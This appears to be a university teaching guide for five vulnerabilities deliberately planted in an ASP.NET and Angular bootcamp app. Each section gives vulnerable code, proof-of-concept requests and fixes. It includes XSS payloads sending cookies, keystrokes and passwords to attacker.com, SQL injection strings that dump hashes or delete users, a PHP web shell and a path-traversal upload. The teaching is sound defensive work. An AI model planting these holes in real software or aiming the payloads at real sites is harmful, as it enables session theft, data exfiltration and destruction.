# 🔐 ElevateBootcamp — Security Vulnerability Demonstration Guide

> ⚠️ **EDUCATIONAL USE ONLY** All vulnerabilities on this branch are intentional and exist solely for university demonstration purposes. **Never deploy this code to a production or internet-facing environment.**

---

## Table of Contents

1. [Buffer Overflow](https://claude.ai/chat/e88340c5-8735-49de-ba6a-8386ca2f8002#1-buffer-overflow)
2. [Missing Input Validation](https://claude.ai/chat/e88340c5-8735-49de-ba6a-8386ca2f8002#2-missing-input-validation)
3. [Cross-Site Scripting (XSS)](https://claude.ai/chat/e88340c5-8735-49de-ba6a-8386ca2f8002#3-cross-site-scripting-xss)
4. [SQL Injection](https://claude.ai/chat/e88340c5-8735-49de-ba6a-8386ca2f8002#4-sql-injection)
5. [Insecure File Upload](https://claude.ai/chat/e88340c5-8735-49de-ba6a-8386ca2f8002#5-insecure-file-upload)

---

## 1. Buffer Overflow

### Vulnerability Name & Concept

A **Buffer Overflow** occurs when a program writes more data into a fixed-size memory buffer than it can hold, corrupting adjacent memory regions (local variables, return addresses, saved registers). In native languages (C/C++) this is the most exploited class of vulnerability, enabling arbitrary code execution by overwriting the stack return address.

In managed runtimes like .NET/C#, the CLR normally prevents this. However, C# supports `unsafe` code blocks with raw pointer arithmetic and `stackalloc`, which allocate memory directly on the stack with **no runtime bounds checking**. This is the canonical way to demonstrate the concept in a C# context.

### The Vulnerable Code

**File:** `Features/VulnerableDemo/BufferOverflowEndpoint.cs` (new file)

```csharp
private static unsafe string ProcessUsernameUnsafe(string username)
{
    const int BUFFER_SIZE = 32; // Fixed 32-byte buffer — intentionally small

    // Allocate exactly 32 bytes on the native stack
    byte* stackBuffer = stackalloc byte[BUFFER_SIZE];
    byte[] inputBytes = Encoding.UTF8.GetBytes(username);

    // ⚠️ NO BOUNDS CHECK — writes ALL bytes regardless of BUFFER_SIZE
    // When inputBytes.Length > 32, writes past the stack allocation
    for (int i = 0; i < inputBytes.Length; i++)
    {
        stackBuffer[i] = inputBytes[i]; // 🔴 Overflow when i >= 32
    }

    return Encoding.UTF8.GetString(stackBuffer, Math.Min(inputBytes.Length, BUFFER_SIZE));
}
```

**The flaw:** The loop bound is `inputBytes.Length` (user-controlled) rather than `BUFFER_SIZE` (32). Any input longer than 32 bytes writes beyond the allocated stack region.

### Proof of Concept (PoC)

**Prerequisites:** Application running locally (`dotnet run` or Docker).

**Step 1 — Normal input (safe, fits in buffer):**

```bash
curl -X POST http://localhost:5000/api/vuln/buffer-overflow \
  -H "Content-Type: application/json" \
  -d '{"username": "Alice"}'
```

Expected: `{"message":"Processed: Alice","length":5}`

**Step 2 — Overflow input (32 bytes exactly — boundary):**

```bash
curl -X POST http://localhost:5000/api/vuln/buffer-overflow \
  -H "Content-Type: application/json" \
  -d '{"username": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"}'
```

Expected: Processes normally (32 chars = 32 bytes, exactly fills buffer).

**Step 3 — Overflow input (>32 bytes — triggers corruption):**

```bash
curl -X POST http://localhost:5000/api/vuln/buffer-overflow \
  -H "Content-Type: application/json" \
  -d '{"username": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"}'
```

Expected: Either `AccessViolationException` or `StackOverflowException`, returned as:

```json
{
  "message": "⚠️ Stack corruption detected by CLR runtime!",
  "exception": "AccessViolationException",
  "detail": "Attempted to read or write protected memory."
}
```

**What this demonstrates:** The `stackalloc` pointer arithmetic writes past the 32-byte boundary into adjacent stack memory. The CLR runtime detects the corrupted stack and throws before control flow is hijacked — but the memory corruption itself occurs first.

You can also test via Swagger UI at `http://localhost:5000/swagger` → tag ⚠️ Vulnerable Demo → `POST /api/vuln/buffer-overflow`.

### Remediation & Defense

```csharp
// ✅ SECURE: explicit upper-bound clamping
int bytesToCopy = Math.Min(inputBytes.Length, BUFFER_SIZE);
for (int i = 0; i < bytesToCopy; i++) // bound = BUFFER_SIZE, not inputBytes.Length
{
    stackBuffer[i] = inputBytes[i];
}

// ✅ BEST PRACTICE: managed Span<T> with automatic bounds checking
Span<byte> safeBuffer = stackalloc byte[BUFFER_SIZE];
inputBytes.AsSpan(0, Math.Min(inputBytes.Length, BUFFER_SIZE)).CopyTo(safeBuffer);
```

**Why the original codebase is safe:** The original application never uses `unsafe` code or raw pointer arithmetic. All string/byte operations use managed types (`string`, `byte[]`, `Span<T>`) whose lengths are always known and bounds-checked by the CLR. There is no `<AllowUnsafeBlocks>true</AllowUnsafeBlocks>` in the original `.csproj`.

---

## 2. Missing Input Validation

### Vulnerability Name & Concept

**Missing Input Validation** means the application accepts and processes user-supplied data without verifying that it meets expected format, length, or type constraints. This is the root cause of many other vulnerability classes (injection, DoS, logic bypasses). It violates the "validate at every boundary" principle of secure design.

### The Vulnerable Code

**File 1:** `Features/Auth/Login/LoginCommandValidator.cs`

```csharp
// 🔴 VULNERABLE: empty validator — no rules enforced
public class LoginCommandValidator : AbstractValidator<LoginCommand>
{
    public LoginCommandValidator()
    {
        // All RuleFor() calls removed — anything passes
    }
}
```

**File 2:** `Features/Auth/Login/LoginRequest.cs`

```csharp
// 🔴 VULNERABLE: no DataAnnotations — no model-level constraints
public record LoginRequest(
    string Email,    // Was: [Required][EmailAddress]
    string Password  // Was: [Required][StringLength(100, MinimumLength = 6)]
);
```

Two layers of defence were removed:

1. **FluentValidation** (pipeline behaviour) — validates the command before the handler runs
2. **DataAnnotations** (DTO attributes) — validates at model binding

### Proof of Concept (PoC)

**Step 1 — Empty fields (should be rejected, now accepted):**

```bash
curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email": "", "password": ""}'
```

- Expected (secure): `400 Bad Request` — "Email is required"
- Actual (vulnerable): Request reaches the handler → "Invalid email or password" (NullRef risk)

**Step 2 — Non-email string bypasses format check:**

```bash
curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email": "not-an-email", "password": "pass"}'
```

- Expected (secure): `400 Bad Request` — "A valid email address is required"
- Actual (vulnerable): Reaches handler, queries DB with malformed email

**Step 3 — BCrypt Denial-of-Service via oversized password:**

```bash
# Generate a 100,000-character password string
python -c "print('A'*100000)" | curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d "{\"email\": \"test@test.com\", \"password\": \"$(python -c 'print(chr(65)*100000)')\"}"
```

**Impact:** BCrypt is intentionally slow (designed for short passwords). Hashing a 100K-character string can take minutes of CPU time. Without a `MaximumLength` guard, an attacker can submit thousands of such requests to saturate server CPU — a targeted DoS attack.

**Step 4 — Demonstrate via Swagger:** Go to `http://localhost:5000/swagger` → `POST /api/auth/login` → Try it out → submit `{}` (empty body).

### Remediation & Defense

```csharp
// ✅ SECURE LoginCommandValidator.cs
public LoginCommandValidator()
{
    RuleFor(x => x.Email)
        .NotEmpty().WithMessage("Email is required")
        .EmailAddress().WithMessage("A valid email address is required");

    RuleFor(x => x.Password)
        .NotEmpty().WithMessage("Password is required")
        .MinimumLength(6).WithMessage("Password must be at least 6 characters");
    // MaximumLength(100) should also be added to prevent BCrypt DoS
}

// ✅ SECURE LoginRequest.cs
public record LoginRequest(
    [Required][EmailAddress] string Email,
    [Required][StringLength(100, MinimumLength = 6)] string Password
);
```

**Why this works:** The FluentValidation pipeline (`ValidationBehavior<T>`) intercepts the MediatR request before the handler executes. If validation fails, it returns `400 Bad Request` immediately. The DataAnnotations provide a second gate at the model-binding layer. Together they ensure the handler only ever receives structurally valid, safe data.

---

## 3. Cross-Site Scripting (XSS)

### Vulnerability Name & Concept

**Cross-Site Scripting (XSS)** is a client-side injection attack where an attacker injects malicious JavaScript into content that is later rendered in other users' browsers. In a **Stored XSS** attack, the payload is persisted in the database (e.g., in an announcement body) and executes every time any user views that content. 

Consequences include: session cookie theft, account hijacking, keylogging, phishing overlays, and full browser control.

### The Vulnerable Code

**File 1:** `components/announcements/announcement-list.component.ts`

```typescript
import { DomSanitizer, SafeHtml } from '@angular/platform-browser';

// 🔴 VULNERABLE: injected to bypass Angular's XSS sanitizer
private sanitizer = inject(DomSanitizer);

// 🔴 VULNERABLE: explicitly disables all HTML sanitization
getTrustedHtml(body: string): SafeHtml {
    return this.sanitizer.bypassSecurityTrustHtml(body);
}
```

**File 2:** `components/announcements/announcement-list.component.html`

```html
<!-- 🔴 VULNERABLE: [innerHTML] renders raw HTML including <script> tags -->
<p class="card-body" [innerHTML]="getTrustedHtml(a.body)"></p>

<!-- SECURE original was: -->
<!-- <p class="card-body">{{ a.body }}</p> -->
```

### Proof of Concept (PoC)

**Prerequisites:** Application running, logged in as Admin or Mentor (both can create announcements).

**Step 1 — Inject a basic alert payload:**

1. Navigate to the Announcements page
2. Click **New Announcement**
3. Set Title: `Important Update`
4. Set Body: `<img src=x onerror="alert('XSS — Cookie: ' + document.cookie)">`
5. Select any target (bootcamp/group/user)
6. Click **Save**

**Step 2 — View as another user:**

1. Log out and log in as any student or instructor
2. Navigate to Announcements
3. Result: The browser executes `alert()` immediately on page load — `document.cookie` is displayed

**Step 3 — Cookie theft (session hijacking) payload:**

```html
<script>
var i = new Image();
i.src = 'http://attacker.com/steal?c=' + encodeURIComponent(document.cookie);
</script>
```

Every user who views the announcements page silently sends their session cookie to the attacker's server.

**Step 4 — Keylogger payload:**

```html
<img src=x onerror="
document.addEventListener('keydown', function(e){
  fetch('http://attacker.com/key?k='+e.key);
});
">
```

**Step 5 — UI Redress (phishing overlay):**

```html
<div style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:#fff;z-index:99999">
  <h2>Session expired. Please log in again.</h2>
  <input id="p" type="password" placeholder="Password">
  <button onclick="fetch('http://attacker.com/?p='+document.getElementById('p').value)">Login</button>
</div>
```

### Remediation & Defense

Angular's default mechanism is already the defence:

```html
<!-- ✅ SECURE: text interpolation — Angular HTML-encodes everything -->
<p class="card-body">{{ a.body }}</p>
```

Angular's `{{ }}` template interpolation is XSS-safe by design. It converts every character with HTML significance to its entity equivalent before inserting into the DOM:

|Character|Encoded|
|---|---|
|`<`|`&lt;`|
|`>`|`&gt;`|
|`"`|`&quot;`|
|`'`|`&#x27;`|

This means `<script>alert('XSS')</script>` becomes the literal text `&lt;script&gt;alert(...)&lt;/script&gt;` — displayed as text, never executed.

> **Rule:** Never call `bypassSecurityTrustHtml()` on user-supplied content. If rich HTML is required, use a server-side allowlist sanitizer (e.g., HtmlSanitizer library) before storing, and still avoid `bypassSecurityTrustHtml()` on the client.

---

## 4. SQL Injection

### Vulnerability Name & Concept

**SQL Injection (SQLi)** occurs when user-supplied input is concatenated directly into a SQL query string. The database cannot distinguish between the query structure (SQL syntax) and the data, so injected SQL keywords/operators are interpreted as commands. This allows attackers to bypass authentication, read all data, modify/delete records, or execute OS-level commands (on misconfigured servers).

### The Vulnerable Code

**File:** `Features/VulnerableDemo/SqlInjectionEndpoint.cs` (new file)

```csharp
// ⚠️ VULNERABLE: raw Npgsql command with string concatenation
var vulnerableSql = $"SELECT \"Id\", \"Name\", \"Email\", \"Role\" " +
                    $"FROM \"Users\" WHERE \"Name\" LIKE '%{name}%'";
                    //                                    ^^^^^^
                    // user-supplied `name` injected directly here

using var command = new NpgsqlCommand(vulnerableSql, connection);
using var reader = await command.ExecuteReaderAsync();
```

The response also echoes `executedQuery` — the exact SQL that ran — so the demo audience can see the injection clearly.

### Proof of Concept (PoC)

**Endpoint:** `GET http://localhost:5000/api/vuln/users/search?name=<PAYLOAD>`

**Step 1 — Normal search (baseline):**

```
GET /api/vuln/users/search?name=Ahmed
```

SQL executed:

```sql
SELECT "Id","Name","Email","Role" FROM "Users" WHERE "Name" LIKE '%Ahmed%'
```

**Step 2 — Authentication bypass / return ALL rows:**

```
GET /api/vuln/users/search?name=' OR '1'='1
```

SQL becomes:

```sql
SELECT "Id","Name","Email","Role" FROM "Users" WHERE "Name" LIKE '%' OR '1'='1%'
```

Result: Returns every user record in the database — the WHERE clause is always true.

**Step 3 — Boolean-based data exfiltration:**

```
GET /api/vuln/users/search?name=' OR role='admin
```

SQL becomes:

```sql
... WHERE "Name" LIKE '%' OR role='admin%'
```

Result: Returns only admin accounts — selective role-based extraction.

**Step 4 — UNION-based attack to exfiltrate password hashes:**

```
GET /api/vuln/users/search?name=x' UNION SELECT "Id","Email","Password","Role" FROM "Users"--
```

SQL becomes:

```sql
SELECT "Id","Name","Email","Role" FROM "Users" WHERE "Name" LIKE '%x'
UNION SELECT "Id","Email","Password","Role" FROM "Users"-- %'
```

Result: The response `data[].email` field now contains BCrypt password hashes from the `Password` column — exfiltrated through the query's own output.

**Step 5 — Destructive injection (DDL):**

> ⚠️ Do not run this on a shared database — it will delete all users.

```
GET /api/vuln/users/search?name=x'; DELETE FROM "Users"; --
```

SQL becomes:

```sql
... WHERE "Name" LIKE '%x'; DELETE FROM "Users"; --%'
```

### Remediation & Defense

**The secure approach — EF Core with LINQ (parameterized automatically):**

```csharp
// ✅ SECURE: EF Core translates LINQ to parameterized SQL
var users = await userRepo.Query()
    .Where(u => u.Name.Contains(name))
    .Select(u => new { u.Id, u.Name, u.Email, u.Role })
    .ToListAsync();
```

EF Core generates: `WHERE "Name" LIKE @p0` — the `@p0` parameter is sent separately from the query text. The database treats `' OR '1'='1` as a literal string value, not SQL syntax. Injection is structurally impossible.

**If raw SQL is required, use parameters:**

```csharp
// ✅ SECURE raw SQL with Npgsql parameters
var sql = "SELECT \"Id\",\"Name\",\"Email\",\"Role\" FROM \"Users\" WHERE \"Name\" LIKE @name";
using var cmd = new NpgsqlCommand(sql, connection);
cmd.Parameters.AddWithValue("name", $"%{name}%"); // parameter, not concatenation
```

**Defence in depth:** The original codebase uses the `IGenericRepository<T>` pattern which exclusively uses EF Core LINQ queries. There is no `ExecuteRawSql()`, `FromSqlRaw()` with concatenation, or direct ADO.NET command usage anywhere in the secure codebase.

---

## 5. Insecure File Upload

### Vulnerability Name & Concept

**Insecure File Upload** is a family of vulnerabilities arising from insufficient validation of uploaded files. Three sub-vulnerabilities are demonstrated:

1. **No Extension Validation** — accepting `.php`, `.exe`, `.aspx` files that can execute server-side code
2. **No MIME Type Checking** — trusting the client-supplied `Content-Type` header (trivially forged)
3. **Path Traversal** — using the client-supplied filename directly, allowing `../../` sequences to write files outside the intended upload directory

### The Vulnerable Code

**File:** `Features/Uploads/UploadMediaEndpoints.cs` (modified)

```csharp
// ❌ REMOVED: extension allowlist
// var allowedExtensions = new[] { ".jpg", ".jpeg", ".png", ... };
// if (!allowedExtensions.Contains(extension)) return BadRequest(...);

// ❌ REMOVED: MIME type / content-type check

// 🔴 VULNERABLE: raw client filename — enables path traversal
var fileName = file.FileName;                          // e.g. "../../evil.php"
var filePath = Path.Combine(uploadsDir, fileName);     // no canonicalization
// uploadsDir = "wwwroot/uploads/media"
// filePath   = "wwwroot/uploads/media/../../evil.php"
//            = "wwwroot/evil.php"  ← escaped the uploads boundary
```

### Proof of Concept (PoC)

**Endpoint:** `POST /api/uploads/media` (multipart/form-data, field name `file`)

#### PoC A — Upload a "web shell" (malicious executable file)

**Step 1:** Create a test file named `shell.php` with content:

```php
<?php system($_GET['cmd']); ?>
```

**Step 2:** Upload it:

```bash
curl -X POST http://localhost:5000/api/uploads/media \
  -F "file=@shell.php;type=image/jpeg"
```

Note: `type=image/jpeg` — we're claiming it's an image. The vulnerable endpoint ignores `ContentType`.

Expected response:

```json
{
  "data": "/uploads/media/shell.php",
  "message": "[VULN-DEMO] File 'shell.php' uploaded without any validation. Extension: .php, ContentType: image/jpeg"
}
```

**Step 3:** The file is now served as static content. On a PHP-enabled server, browsing to `http://localhost:5000/uploads/media/shell.php?cmd=whoami` would execute `whoami` on the server OS.

#### PoC B — Path Traversal to overwrite server configuration

**Step 1:** Craft a multipart request using Python (curl doesn't allow `../` in filenames easily):

```python
import requests
with open('fake_image.jpg', 'rb') as f:
    # The filename contains path traversal sequences
    requests.post(
        'http://localhost:5000/api/uploads/media',
        files={'file': ('../../appsettings.json', f, 'image/jpeg')}
    )
```

**What happens:** `Path.Combine("wwwroot/uploads/media", "../../appsettings.json")` resolves to `wwwroot/appsettings.json` — and since `wwwroot` is served as static files, the overwritten config is immediately readable at `http://localhost:5000/appsettings.json` — exposing JWT secrets, DB connection strings, etc.

**Step 2:** Verify by visiting `http://localhost:5000/appsettings.json` after the upload.

#### PoC C — Upload `.exe` to exhaust disk space (storage DoS)

No size limit + no type restriction = disk exhaustion DoS.

```bash
# Create a 500MB file
dd if=/dev/zero of=bigfile.exe bs=1M count=500
curl -X POST http://localhost:5000/api/uploads/media \
  -F "file=@bigfile.exe"
```

### Remediation & Defense

The original secure upload endpoint does three things right:

```csharp
// ✅ 1. Extension allowlist — only safe media types accepted
var allowedExtensions = new[] { ".jpg", ".jpeg", ".png", ".gif",
                                ".webp", ".mp4", ".webm", ".avi", ".mov", ".mkv" };
if (!allowedExtensions.Contains(extension))
    return Results.BadRequest("Invalid file type. Only images and videos are allowed.");

// ✅ 2. Server-generated filename — client filename is NEVER used
var fileName = $"{Guid.NewGuid()}{extension}";  // e.g. "a3f1b2c4-....jpg"

// ✅ 3. No path traversal possible — Guid filename contains no path separators
var filePath = Path.Combine(uploadsDir, fileName);
```

**Additional hardening recommendations (beyond the original):**

```csharp
// ✅ MIME type validation using magic bytes (not Content-Type header)
// Read first bytes of the stream and check against known signatures:
// JPEG: FF D8 FF | PNG: 89 50 4E 47 | GIF: 47 49 46 38

// ✅ File size limit
if (file.Length > 50 * 1024 * 1024) // 50 MB max
    return Results.BadRequest("File too large.");

// ✅ Path canonicalization to catch traversal even with GUID filenames
var fullPath = Path.GetFullPath(filePath);
if (!fullPath.StartsWith(Path.GetFullPath(uploadsDir)))
    return Results.BadRequest("Invalid file path.");
```

**Why GUID filenames matter beyond path traversal:** Even if extension validation is in place, using the original filename risks: collisions (overwriting other users' files), information leakage (filenames reveal user info), and directory enumeration. A GUID filename is opaque, collision-resistant, and impossible to predict.

---

## Summary Reference Table

|#|Vulnerability|File(s) Modified|OWASP Category|
|---|---|---|---|
|1|Buffer Overflow|`Features/VulnerableDemo/BufferOverflowEndpoint.cs` (NEW)|A06 Vulnerable Components|
|2|Missing Input Validation|`Login/LoginCommandValidator.cs`, `Login/LoginRequest.cs`|A03 Injection / A04 Insecure Design|
|3|XSS (Stored)|`announcement-list.component.html`, `.ts`|A03 Injection (XSS)|
|4|SQL Injection|`Features/VulnerableDemo/SqlInjectionEndpoint.cs` (NEW)|A03 Injection|
|5|Insecure File Upload|`Features/Uploads/UploadMediaEndpoints.cs`|A04 Insecure Design|

---

## Running the Demo Locally

```bash
# 1. Start the backend (from backend directory)
dotnet run

# 2. Start the frontend (from frontend directory)
npm start

# 3. Open Swagger UI for backend demos
open http://localhost:5000/swagger

# 4. Open the app for the XSS demo
open http://localhost:4200
```

> **Restore to secure state:** `git checkout` the original files, or revert the changes listed in each section above.
